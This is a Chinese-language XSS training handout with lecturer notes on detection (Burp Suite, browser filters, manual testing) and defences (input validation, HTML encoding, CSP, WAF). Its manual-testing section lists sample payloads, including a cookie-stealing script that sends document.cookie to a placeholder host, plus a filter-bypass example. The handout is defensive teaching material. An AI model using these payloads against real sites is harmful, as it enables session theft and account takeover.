动态分析是咱们的系统在运行的时候，通过模拟真实用户的操作，检测Web应用中是否存在XSS漏洞。那这种方法通常结合用户行为进行实时检测，不仅可以发现静态代码分析无法检测的漏洞，还能更准确地验证漏洞的实际影响。
——————————————————————————————————————————————————————————————












我给使用两款工具帮大家更直观的体验一下动态分析。
burpswit是一款非常强大的Web应用程序安全测试工具，集成了很多种强大的模块，方便咱们渗透测试人员在一个平台内完成全面的 Web 应用安全测试，包括一些抓包、扫描，自动化攻击等等。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112765.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112766.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112767.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112768.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112769.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112770.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112771.jpg)

通过实际交互，能够检测到运行时才暴露的漏洞。

进行动态监测时，可能会对程序的正常运行产生一定的影响。

---

     动态分析直接在运行环境中执行，能够验证XSS漏洞的实际存在和影响，避免了静态分析可能出现的误报情况。也可以直接观察恶意脚本是否执行，从而确认漏洞的可利用性；动态分析模拟用户交互，尤其是那些需要用户操作才能触发的 XSS 漏洞。
————————————————————————————————————————————————————————————————
     缺点：动态分析涉及页面加载、用户交互和脚本执行，这个过程可能耗费大量系统资源。模拟复杂的交互场景需要消耗大量时间和计算资源，可能会对测试环境的性能造成影响；还有涉及多个页面或跨域的复杂交互，动态分析难以实现全面检测，而跨域策略限制还可能导致部分动态分析工具没办法正常的执行。
————————————————————————————————————————————————————————————————
     其实，无论是静态分析还是动态监测，各有其独特的优点和局限性，我们在使用中还是需要根据我们实际的业务场景，选取我们最优的解决方案。

_3\._  _浏览器内置的 XSS 过滤器_

_Chrome XSS Auditor：_

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112772.jpg)

Chrome 使用 XSS Auditor 来检测和阻止一些反射型 XSS 攻击。

_Internet Explorer 的 XSS Filter：_

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112773.jpg)

IE 内置 XSS 过滤器，检测并拦截反射型 XSS

---

      浏览器内置的 XSS 过滤器是一种安全机制，用于检测和阻止跨站脚本攻击，这些过滤器会分析网页内容和用户输入，如果检测到可能的 XSS 攻击代码，就会自动阻止脚本的执行。这种机制在一些常见浏览器中均有实现，但它们的行为和策略有所不同。
我们作为开发者其实不需要特别关注，因为浏览器自己已经做好了相关的设置。
——————————————————————————————————————————————————————————————
过滤器呢与上面讲的一些专门的检测方法相比，其实浏览器内置的XSS过滤器更多地是一种被动的防御手段。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112774.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112775.png)

可能无法检测到更复杂的 XSS 攻击，尤其是 DOM 型 XSS 攻击。

---

它的优点：无需额外配置，过滤器自动在浏览器端运行，对用户和开发者都是无感知的保护机制。过滤器可以在页面加载时检测并阻止一些简单的 反射型XSS攻击。
缺点：检测的能力是有限的，主要针对反射型 XSS，没有办法完全保护用户不受DOM 型和存储型XSS攻击。

<span style="color:#000000">经验丰富的网安人员可以发现自动工具无法检测的复杂漏洞</span>  <span style="color:#000000">。</span>

<span style="color:#000000">根据经验检查用户输入处理、输出转义是否严格遵守安全规范</span>  <span style="color:#000000">。</span>

<span style="color:#000000">需要时间和技术经验</span>  <span style="color:#000000">，</span>  <span style="color:#000000">审查的完整性可能依赖于个人能力</span>  <span style="color:#000000">。</span>

<span style="color:#000000">通过自己编写恶意输入，手动测试应用程序的响应行为，判断是否存在漏洞。</span>

---

我们刚才给大家的讲的那些实例其实就是手动审查，这种方式需要有经验的网络安全人员或开发者自己进行代码审查，然后自己编写测试的脚本，手动检测咱们的程序是否存在潜在的漏洞，手动检查可以发现一些工具没办法检测的复杂漏洞，那这种检测方式可能依赖我们检测人员的技术能力。

手动测试 <span style="color:#FF0000">反射型</span> 和 <span style="color:#FF0000">存储型</span>  XSS 通常涉及向应用程序中的每个 <span style="color:#FF0000">注入</span>  <span style="color:#FF0000">点</span> 提交一些简单的唯一输入（例如简短的字母数字字符串），

识别 HTTP 响应中返回提交的输入的每个位置，并单独测试每个位置以确定是否可以使用适当制作的输入来执行任意 JavaScript脚本。

通过这种方式，可以确定XSS 发生的上下文并选择合适的脚本来利用它。

---

我们看一下手动检测反射型和存储型的方法，我们做完训练场的习题之后，相信大家都有更深的理解。

手动测试由 URL 参数引起的基于 DOM 的 XSS 涉及类似的过程：在参数中放置一些简单的唯一输入，使用 <span style="color:#FF0000">浏览器的开发工具</span> 在 DOM 中搜索此输入，并测试每个位置以确定它是否可利用。但是，其他类型的 DOM XSS 更难检测。要查找非基于 URL 的输入（例如document\.cookie）或非基于 HTML 的接收器（如setTimeout）中的基于 DOM 的漏洞，没有什么可以替代检查 JavaScript 代码，这可能非常耗时。

---

我们再看一下dom型的输入

1\.基础脚本： <span style="color:#FF0000">\<script>alert\('xss'\)\</script></span>  <span style="color:#FF0000">；</span>

2\.使用 html 标签中的触发事件： <span style="color:#FF0000">\<a href='' onclick=alert\('xss'\)>type\</a></span>  \,类似的还有onload等；

3\.当 src 中内容不存在或者错误时，将会弹出弹窗：

<span style="color:#FF0000">\<img src=http://127\.0\.0\.1/a\.jpg onerror=alert\('xss'\)></span>  <span style="color:#FF0000">；</span>

4\.直接在当前窗口跳转指定网页：

<span style="color:#FF0000">\<script>window\.location='https://www\.</span>  <span style="color:#FF0000">xxxx</span>  <span style="color:#FF0000">\.com/'\</script></span>  <span style="color:#FF0000">；</span>

5\.获取 cookie 值：

<span style="color:#FF0000">\<script>new</span>  <span style="color:#FF0000"> </span>  <span style="color:#FF0000">Image\(\)\.src="http://</span>  <span style="color:#FF0000">xxxx</span>  <span style="color:#FF0000">/c\.php?output="\+document\.cookie;\</script></span>

6\. \.\.\.\.\.\.

---

这个就是适用于检测的一些脚本。
————————————————————————————————————————————————————————
其实总结下来，上面说的这些检测的方式都存在自己的优势和不足，那还是那句话，我们还是要联系我们自己项目的实际场景，多种检测方式融合使用。

XSS防御方法

06

# XSS – 防御策略

<span style="color:#262626">限制输入内容的长度，防止超长输入导致的溢出攻击。</span>

<span style="color:#FFFFFF">限制输入内容的类型，如只允许数字、字母等，防止非法字符的输入。对</span>  <span style="color:#FFFFFF">DOM</span>  <span style="color:#FFFFFF">节点影响比较大的就是单引号和双引号</span>  <span style="color:#FFFFFF">。</span>

<span style="color:#262626">对输入内容进行格式校验，确保输入符合预期的格式要求。</span>

如双写：\<scr<script>ipt>alert\(/xss/\)\</script>

---

防御方法有这么几大类，我们看一下第一类就是输入内容的限制
那首先长度、类型，特殊字符的输入验证。
   1.对于一些标签的 < 和 > ，让他们在 HTML 中不会以一个script 标签形式执行。
   2.然后，对于DOM节点影响比较大的就是单引号和双引号，因为他们会关闭属性的值闭合，利用HTML标签间的空隙注入恶意脚本。
 3.将用户输入的数据进行HTML实体编码，以确保特殊字符不会被浏览器解释成HTML的标签或脚本。

在输出用户输入内容到HTML页面时，使用HTML实体编码来防止XSS攻击，如将"<"转换为"&lt;"。

在JavaScript中处理用户输入时，应用JavaScript编码技术，例如使用textContent等方法代替innerHTML确保数据安全。

对CSS属性进行编码，防止XSS攻击

---

1.在输出的阶段，有些情况也是要对实体编码的，像之前的存储型。可能输入过滤的策略被攻击者绕过了，但是输出没有限制，也可能出现漏洞。
2.使用更安全的DOM操作方法：比如说对innerHTML这个方法，如果一定这样使用，必须对这块的内容进行适当的过滤和转义；或者考虑使用代替的方法像textContent。
3.因为innerHTML，它允许开发者动态地向页面添加HTML内容，将一个字符串作为HTML代码插入到页面的某个元素中；
textContent属性只会设置指定元素内的纯文本内容，不包括HTML标签。

__HTML__  __编码转义__

通过一些函数把预定义的字符转换为HTMl实体，

就是为了防止特殊符号如"\<、>、&、‘"等当成html标签。

例如：服务器端php中 <span style="color:#FF0000">htmlspecialchars\(\)</span> 方法可以把特殊字符转义。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112776.png)

---

这里我们以php为例，列举了一个对html编码转义的方法，那咱们课程习题里也有关于这个使用这个方法的习题。
在咱们实际开发当中，咱们需要针对不同的开发语言选取自己的方案。


_（_  _Content Security Policy）_

先以报告模式实施CSP，监控违规行为而不阻止，确保策略正确无误后再启用强制模式。

利用CSP与浏览器内置的XSS过滤器相结合，增强网站对反射型和存储型XSS攻击的防御能力。

通过设置HTTP头部，定义CSP指令来限制资源加载，如script\-src限制脚本来源。

---

1.CSP是一种网络安全机制，用于防止各种攻击，特别是跨站脚本（XSS）攻击和数据注入攻击。
它通过定义哪些资源可以被加载和执行，来限制网页上能够运行的内容。实际上我们就可以把它理解为白名单
——————————————————————————————————————————————
2.它的主要目的是通过规定哪些外部资源可以被加载到页面上，来增加网站的安全性。这些外部资源包括JavaScript文件、CSS样式表、图片、字体文件等。通过定义一组策略来告诉浏览器哪些外部资源是可信的，哪些是不可信的。
——————————————————————————————————————————————
那么使用它就一定是好的么，显然是不一定的，如果使用，一定要仔细规划和测试，因为可能过于严格的 CSP 会阻止某些正常功能，例如内联脚本或第三方资源，导致页面无法正常加载或功能受限；还有可能增加维护的成本，因为配置和维护 CSP 可能比较复杂，特别是对于大型应用程序，开发人员需要花费额外时间来调试和调整策略；在实施 CSP 时，重要的是根据应用需求以及业务场景进行合理配置，以最大限度减少这些潜在的负面影响。

__   CSP__  __设置__  __方式__

1\.在HTML页面中通过\<meta>标签设置

在HTML页面的\<head>部分，可以通过添加\<meta>标签来设置CSP策略。这种方法适用于没有权限或能力修改服务器HTTP响应头的情况 。例如：

<span style="color:#FF0000">\<meta http\-equiv="Content\-Security\-Policy" content="default\-src 'self'"> </span>

2\.在服务器端，修改HTTP响应头中的Content\-Security\-Policy字段来定义CSP策略

这通常涉及到编辑Web服务器的配置文件或在应用程序的代码中添加相应的HTTP头部。根据不同的开发语言和开发框架定义。

---

csp设置其实可以分为客户端和服务端，我们可以通过服务端或客户端中的任一方来实施，但通常推荐在服务端进行设置。
1.那如果想在客户端进行设置的，我们可以在<meta>标签设置，像我们ppt这个设置的这个策略，
那这个策略呢表示只允许从同域下加载资源；类似地，还可以为其他类型的资源（如脚本、图片等）指定的加载策略。
————————————————————————————————————————————————————
2.在服务端，CSP策略则通过设置HTTP响应头中的Content-Security-Policy字段来定义，服务器在发送HTTP响应时，会将这个头部字段包含在响应中，会告诉浏览器应该遵循的CSP策略。

__  __  __服务器端设置__  __CSP__

1\.如使用web服务器，Apache或Nginx等。

例如：nginx服务器，在Nginx的配置文件中添加

<span style="color:#FF0000">add\_header Content\-Security\-Policy "default\-src 'self'; script\-src 'self' https://trusted\.com; object\-src 'none';";</span>

2\.根据开发语言

2\.1 PHP： <span style="color:#FF0000">header\("Content\-Security\-Policy: default\-src 'self'; script\-src 'self' https://trusted\.com; object\-src 'none';"\);</span>  <span style="color:#FF0000"> </span>

<span style="color:#FF0000">   </span> 2\.2 JAVA：或者在Java web应用中使用过滤器（Filter）来添加CSP头部。

2\.3 \.\.\.\.\.\.\.

---

1.我们如果使用了的web服务器，像apache，nginx等等，设置方式也有所不同，但是原理是一致的。
2.还有也可以根据不同的开发语言去进行一些不同的实施方案。

_（_  _Web Application Firewall_  _）_

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112777.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112778.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112779.jpg)

对进入的请求内容进行管理和转换，以确保它们符合安全标准。

<span style="color:#FFFFFF">设置规则检测异常流量，如频繁请求、异常数据等，及时阻断</span>  <span style="color:#FFFFFF">。</span>

设置默认的安全规则，如过滤常见XSS攻击，或设置特定的安全规则。

---

之后呢，我们也有专门一节课来学习waf
WAF 是一种专门设计用于保护 Web 应用程序的安全设备或着是软件。它会通过分析和过滤 HTTP 请求和响应来检测和阻止恶意的流量。
其中也包括了请求过滤：WAF 可以检查传入请求中的参数、表单数据和头部信息，确保它们符合预期格式，阻止不合法的输入。
利用正则表达式或是一些特征匹配技术，WAF 可以识别常见的 XSS 攻击模式（如 <script> 标签、onerror、onclick 等）。
一些高级 WAF 具备机器学习能力，能够分析正常用户行为并识别异常活动，从而检测潜在的 XSS 攻击。
使用waf也不一定都正向的，某些复杂的 Web 应用可能会导致 WAF 难以准确识别正常与恶意流量，WAF 的部署可能会影响应用性能，因此需要在安全和性能之间进行平衡。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112780.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112781.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112782.jpg)

__选择经验证、安全的API，避免使用存在已知漏洞的API__  __。__

__使用如__  __OWASP __  __ __  __AntiSamy或__  __XSS\.js__  __库等__  __。__

__如__  __遵循OWASP指导__  __，__  __采用__  __其作为安全编码的基准__  __。__

---

1.开发的时候使用了一些框架，像现在前端的vue、react这些框架都提供了一些防御xss机制。
2.选择经过验证的、安全的API，避免使用存在已知漏洞的API。定期更新和维护使用的API，确保及时修复已知的安全漏洞。

XSS学习资源

07

# XSS – 学习资源

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112783.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112784.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112785.jpg)

推荐Portswigger和Coursera上的网络安全课程，它们提供了丰富的XSS攻击与防御知识。

《Web应用安全权威指南》和《黑客攻防技术宝典：Web实战篇》是学习XSS攻击与防御的经典书籍。

参与GitHub上的OWASP项目，通过实际代码审查和漏洞测试来加深对XSS攻击的理解。

---

1.Portswigger.net 是BurpSuite的官方网站，同时也是一个非常出色的Web安全漏洞训练平台。该平台提供了丰富的靶场，专注于Web安全漏洞的实战训练。
    大家如果有机会，也可以使用我们的天机平台的靶场训练，我们的靶场已经建设的非常全面了，并且我们还在不断的扩充我们的资源和相应的工具，可以给大家很多学习这方面的资源。
     那么还有一些web应用安全和黑客攻防技术的书籍，大家平时如果有时间也可以去github上去搜集一些开源的项目等等，这些都能对我们平时开发遇到安全问题，提供一些解决的思路。
那今天的课程就到这里，再次感谢大家的参与和支持。

---

那今天的课程就到这里，再次感谢大家的参与和支持。

